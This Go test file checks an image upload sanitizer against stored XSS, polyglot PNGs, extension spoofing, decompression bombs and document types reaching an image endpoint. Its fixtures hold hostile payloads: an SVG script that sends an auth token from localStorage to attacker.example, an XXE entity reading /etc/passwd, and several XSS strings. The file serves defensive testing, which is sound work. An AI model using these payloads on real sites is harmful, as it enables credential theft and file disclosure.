package upload

import (
	"bytes"
	"image"
	"image/color"
	"image/gif"
	"image/jpeg"
	"image/png"
	"path/filepath"
	"strings"
	"testing"
)

// --- helpers ---------------------------------------------------------------

func pngBytes(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for x := 0; x < w; x++ {
		for y := 0; y < h; y++ {
			img.Set(x, y, color.RGBA{R: uint8(x % 256), G: uint8(y % 256), B: 0x40, A: 0xFF})
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatalf("encode png fixture: %v", err)
	}
	return buf.Bytes()
}

func jpegBytes(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	var buf bytes.Buffer
	if err := jpeg.Encode(&buf, img, nil); err != nil {
		t.Fatalf("encode jpeg fixture: %v", err)
	}
	return buf.Bytes()
}

func gifBytes(t *testing.T, frames int) []byte {
	t.Helper()
	g := &gif.GIF{}
	for i := 0; i < frames; i++ {
		pal := image.NewPaletted(image.Rect(0, 0, 8, 8), color.Palette{color.Black, color.White})
		g.Image = append(g.Image, pal)
		g.Delay = append(g.Delay, 10)
	}
	var buf bytes.Buffer
	if err := gif.EncodeAll(&buf, g); err != nil {
		t.Fatalf("encode gif fixture: %v", err)
	}
	return buf.Bytes()
}

func defaultOpts() Options {
	return Options{MaxBytes: 5 << 20, AllowedTypes: []string{"png", "jpg", "jpeg", "gif"}}
}

// --- rejection of active content -------------------------------------------

// The core of the stored-XSS defence: nothing that a browser could treat as a
// document may pass validation, regardless of what it is named or how it declares
// itself.
func TestSanitizeImageRejectsActiveContent(t *testing.T) {
	cases := []struct {
		name    string
		payload []byte
	}{
		{
			name:    "plain html",
			payload: []byte(`<!doctype html><html><body><script>alert(document.domain)</script></body></html>`),
		},
		{
			name: "svg with script",
			payload: []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">` +
				`<script>fetch('//attacker.example/'+localStorage.getItem('shiftmaster-auth'))</script></svg>`),
		},
		{
			name:    "svg with event handler",
			payload: []byte(`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><rect width="1" height="1"/></svg>`),
		},
		{
			name:    "xml external entity",
			payload: []byte(`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`),
		},
		{
			name:    "html with png magic prefix",
			payload: append([]byte("\x89PNG\r\n\x1a\n"), []byte(`<script>alert(1)</script>`)...),
		},
		{
			name:    "pdf",
			payload: []byte("%PDF-1.7\n1 0 obj<</Type/Catalog>>endobj"),
		},
		{
			name:    "elf binary",
			payload: []byte("\x7fELF\x02\x01\x01\x00 rest of a binary"),
		},
		{
			name:    "empty",
			payload: []byte{},
		},
		{
			name:    "whitespace only",
			payload: []byte("   \n\t  "),
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := SanitizeImageBytes(tc.payload, defaultOpts())
			if err == nil {
				t.Fatalf("expected rejection, got accepted file %q (%s)", got.Filename, got.ContentType)
			}
		})
	}
}

// Renaming a payload to an image extension must not help: validation never reads
// the filename, only the bytes.
func TestExtensionSpoofingDoesNotBypassValidation(t *testing.T) {
	html := []byte(`<html><script>alert(1)</script></html>`)

	for _, name := range []string{"evil.png", "evil.jpg", "evil.gif", "evil.PNG", "evil.png.html", "evil.html.png"} {
		t.Run(name, func(t *testing.T) {
			if _, err := SanitizeImageBytes(html, defaultOpts()); err == nil {
				t.Fatalf("HTML content named %q was accepted", name)
			}
		})
	}
}

// --- polyglot handling ------------------------------------------------------

// A file can be a structurally valid PNG *and* carry a payload after the image
// data. Decoding alone would accept it; re-encoding is what removes the payload.
func TestPolyglotPayloadIsStrippedByReencoding(t *testing.T) {
	payload := []byte(`<script>alert(document.domain)</script>`)
	polyglot := append(pngBytes(t, 16, 16), payload...)

	if !bytes.Contains(polyglot, payload) {
		t.Fatal("fixture is not a polyglot")
	}

	got, err := SanitizeImageBytes(polyglot, defaultOpts())
	if err != nil {
		t.Fatalf("valid PNG with appended payload should be accepted after cleaning: %v", err)
	}

	if bytes.Contains(got.Data, payload) {
		t.Fatal("appended script payload survived re-encoding")
	}
	if bytes.Contains(bytes.ToLower(got.Data), []byte("<script")) {
		t.Fatal("script markup survived re-encoding")
	}

	// The cleaned output must still be a real image.
	if _, _, err := image.Decode(bytes.NewReader(got.Data)); err != nil {
		t.Fatalf("re-encoded output is not decodable: %v", err)
	}
}

// A PNG carrying a payload inside a text chunk must not survive either.
func TestTextChunkPayloadIsStripped(t *testing.T) {
	base := pngBytes(t, 8, 8)
	marker := []byte("<img src=x onerror=alert(1)>")

	// Splice the marker into the middle of the file, then confirm that whatever
	// the decoder makes of it, the marker is not present in the stored output.
	spliced := make([]byte, 0, len(base)+len(marker))
	spliced = append(spliced, base[:len(base)/2]...)
	spliced = append(spliced, marker...)
	spliced = append(spliced, base[len(base)/2:]...)

	got, err := SanitizeImageBytes(spliced, defaultOpts())
	if err != nil {
		return // Corrupting the stream made it undecodable; rejection is also correct.
	}
	if bytes.Contains(got.Data, marker) {
		t.Fatal("injected markup survived re-encoding")
	}
}

// --- acceptance of legitimate images ---------------------------------------

func TestSanitizeImageAcceptsRealImages(t *testing.T) {
	cases := []struct {
		name        string
		data        []byte
		wantFormat  string
		wantExt     string
		wantContent string
	}{
		{"png", pngBytes(t, 32, 24), "png", ".png", "image/png"},
		{"jpeg", jpegBytes(t, 32, 24), "jpeg", ".jpg", "image/jpeg"},
		{"gif", gifBytes(t, 1), "gif", ".gif", "image/gif"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := SanitizeImageBytes(tc.data, defaultOpts())
			if err != nil {
				t.Fatalf("legitimate %s rejected: %v", tc.name, err)
			}
			if got.Format != tc.wantFormat {
				t.Errorf("format = %q, want %q", got.Format, tc.wantFormat)
			}
			if filepath.Ext(got.Filename) != tc.wantExt {
				t.Errorf("extension = %q, want %q", filepath.Ext(got.Filename), tc.wantExt)
			}
			if got.ContentType != tc.wantContent {
				t.Errorf("content type = %q, want %q", got.ContentType, tc.wantContent)
			}
			if len(got.Data) == 0 {
				t.Error("no data returned")
			}
		})
	}
}

// Animation must survive: a naive image.Decode would flatten a GIF to one frame.
func TestAnimatedGifKeepsAllFrames(t *testing.T) {
	got, err := SanitizeImageBytes(gifBytes(t, 4), defaultOpts())
	if err != nil {
		t.Fatalf("animated gif rejected: %v", err)
	}

	decoded, err := gif.DecodeAll(bytes.NewReader(got.Data))
	if err != nil {
		t.Fatalf("re-encoded gif is not decodable: %v", err)
	}
	if len(decoded.Image) != 4 {
		t.Errorf("frame count = %d, want 4 (animation was flattened)", len(decoded.Image))
	}
}

// --- filename generation ----------------------------------------------------

// The client's filename must never reach the filesystem or the served URL.
func TestStoredFilenameIsServerGenerated(t *testing.T) {
	data := pngBytes(t, 8, 8)

	first, err := SanitizeImageBytes(data, defaultOpts())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	second, err := SanitizeImageBytes(data, defaultOpts())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if first.Filename == second.Filename {
		t.Error("identical uploads produced the same filename; names must be unpredictable")
	}

	// A UUID plus extension: 36 + 4.
	if len(first.Filename) != 40 {
		t.Errorf("filename %q is not a uuid+extension", first.Filename)
	}
	if strings.ContainsAny(first.Filename, "/\\ ") {
		t.Errorf("filename %q contains unsafe characters", first.Filename)
	}
	if err := ValidateStoredName(first.Filename); err != nil {
		t.Errorf("generated filename fails its own validation: %v", err)
	}
}

// --- limits -----------------------------------------------------------------

func TestOversizedUploadRejected(t *testing.T) {
	data := pngBytes(t, 256, 256)

	opts := Options{MaxBytes: int64(len(data) - 1), AllowedTypes: []string{"png"}}
	if _, err := SanitizeImageBytes(data, opts); err == nil {
		t.Fatal("oversized upload was accepted")
	}

	opts.MaxBytes = int64(len(data))
	if _, err := SanitizeImageBytes(data, opts); err != nil {
		t.Fatalf("upload exactly at the limit should be accepted: %v", err)
	}
}

// A small file that decodes to an enormous canvas must be refused before the
// allocation happens.
func TestDecompressionBombRejected(t *testing.T) {
	// A 1x1 PNG header rewritten to claim 30000x30000 (900MP) would allocate
	// several gigabytes. Build the header directly.
	huge := pngBytes(t, 1, 1)
	// IHDR width/height live at byte offsets 16..23.
	if len(huge) < 24 {
		t.Fatal("png fixture too short")
	}
	bomb := make([]byte, len(huge))
	copy(bomb, huge)
	// 30000 = 0x00007530
	copy(bomb[16:20], []byte{0x00, 0x00, 0x75, 0x30})
	copy(bomb[20:24], []byte{0x00, 0x00, 0x75, 0x30})

	if _, err := SanitizeImageBytes(bomb, defaultOpts()); err == nil {
		t.Fatal("decompression bomb was accepted")
	}
}

// --- configured allowlist ---------------------------------------------------

func TestConfiguredAllowedTypesAreHonored(t *testing.T) {
	pngData := pngBytes(t, 8, 8)
	gifData := gifBytes(t, 1)

	onlyPNG := Options{MaxBytes: 5 << 20, AllowedTypes: []string{"png"}}

	if _, err := SanitizeImageBytes(pngData, onlyPNG); err != nil {
		t.Fatalf("png should be accepted when configured: %v", err)
	}
	if _, err := SanitizeImageBytes(gifData, onlyPNG); err == nil {
		t.Fatal("gif accepted although the configuration allows only png")
	}
}

// Listing a document type in UPLOAD_ALLOWED_TYPES must never make it acceptable
// to an image endpoint.
func TestDocumentTypesNeverReachImageEndpoint(t *testing.T) {
	opts := Options{MaxBytes: 5 << 20, AllowedTypes: []string{"pdf", "doc", "docx", "html", "svg"}}

	if _, err := SanitizeImageBytes([]byte("%PDF-1.7"), opts); err == nil {
		t.Fatal("pdf accepted by an image endpoint")
	}
	if _, err := SanitizeImageBytes([]byte(`<svg xmlns="http://www.w3.org/2000/svg"/>`), opts); err == nil {
		t.Fatal("svg accepted by an image endpoint")
	}

	// And a real PNG is refused because the operator did not list it.
	if _, err := SanitizeImageBytes(pngBytes(t, 8, 8), opts); err == nil {
		t.Fatal("png accepted although it is not in the configured allowed types")
	}
}

func TestEmptyAllowedTypesMeansAllSupportedFormats(t *testing.T) {
	opts := Options{MaxBytes: 5 << 20}
	for name, data := range map[string][]byte{
		"png":  pngBytes(t, 8, 8),
		"jpeg": jpegBytes(t, 8, 8),
		"gif":  gifBytes(t, 1),
	} {
		if _, err := SanitizeImageBytes(data, opts); err != nil {
			t.Errorf("%s rejected with no configured restriction: %v", name, err)
		}
	}
}

// --- content type table -----------------------------------------------------

// Serving code relies on this table, so it must never yield a document type.
func TestContentTypeForExt(t *testing.T) {
	safe := []string{"png", ".png", "JPG", ".jpeg", "gif"}
	for _, ext := range safe {
		ct, ok := ContentTypeForExt(ext)
		if !ok {
			t.Errorf("ContentTypeForExt(%q) = not ok, want a type", ext)
			continue
		}
		if !strings.HasPrefix(ct, "image/") {
			t.Errorf("ContentTypeForExt(%q) = %q, want an image type", ext, ct)
		}
	}

	dangerous := []string{"html", ".html", "htm", "svg", ".svg", "js", "xml", "pdf", "", ".", "php"}
	for _, ext := range dangerous {
		if ct, ok := ContentTypeForExt(ext); ok {
			t.Errorf("ContentTypeForExt(%q) = %q, want rejection", ext, ct)
		}
	}
}

// Legacy uploaders stored webp and bmp files before validation existed; they
// must stay servable (passive raster types), while active content stays out.
func TestContentTypeForExtLegacyTypes(t *testing.T) {
	cases := []struct {
		ext  string
		want string
		ok   bool
	}{
		{".webp", "image/webp", true},
		{".WEBP", "image/webp", true},
		{".bmp", "image/bmp", true},
		{".svg", "", false},
		{".html", "", false},
		{".pdf", "", false},
		{".png", "image/png", true},
	}
	for _, c := range cases {
		got, ok := ContentTypeForExt(c.ext)
		if got != c.want || ok != c.ok {
			t.Errorf("ContentTypeForExt(%q) = (%q, %v), want (%q, %v)", c.ext, got, ok, c.want, c.ok)
		}
	}
}
